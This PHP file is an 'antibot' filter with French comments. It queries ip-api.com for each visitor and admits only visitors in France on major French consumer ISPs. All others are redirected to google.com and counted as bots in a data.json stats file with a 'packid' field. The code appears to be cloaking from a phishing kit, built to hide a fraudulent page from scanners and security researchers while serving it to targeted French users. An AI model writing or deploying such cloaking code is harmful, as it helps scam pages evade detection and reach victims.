<?php
$ip = $_SERVER['REMOTE_ADDR'];
// ANTIBOT FRANCE
function checkUser($ip){
    // Récupération des donnés
    $json = file_get_contents("http://ip-api.com/json/".$ip."?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
    $parsed_json = json_decode($json);
    // Stockage des donnés
    $country = strtolower($parsed_json->{'country'});
    $isp = strtolower($parsed_json->{'isp'});
    $as = strtolower($parsed_json->{'as'});
    $target = $isp." ".$as;
    // Listage des mots du nom de fournisseur
    $explodeIsp = explode(" ", $target);
    // Opérateurs autorisé
    $operator = "free sfr orange bbox bouygues laposte";
    $explodeOperator = explode(" ", $operator);
    // Pays autorisé
    $country_access = "france";
    if($country == $country_access){
        $m = 0;
        while($m < count($explodeIsp)){
            $i = 0;
            while($i < count($explodeOperator)){
                if($explodeIsp[$m] == $explodeOperator[$i]){
                    return TRUE;
                }
                $i++;
            }
            $m++;
        }
        return FALSE;
    }
    else{
        return FALSE;
    }
}

// EXECUTION DE LANTIBOT
if(checkUser($ip) != TRUE){
    header('Location: https://google.com');
    $str = file_get_contents("data.json");
    $arr = json_decode($str);
    $visit = $arr->{'stats'}->{'visit'};
    $packid = $arr->{'stats'}->{'packid'};
    $bot = $arr->{'stats'}->{'bot'};
    $new_counter = array(
        'stats' => array(
            'visit'=> $visit,
            'packid'=> $packid, 
            'bot'=> $bot+1,
        )
    );
    file_put_contents('data.json', json_encode($new_counter, JSON_PRETTY_PRINT));
}
?>
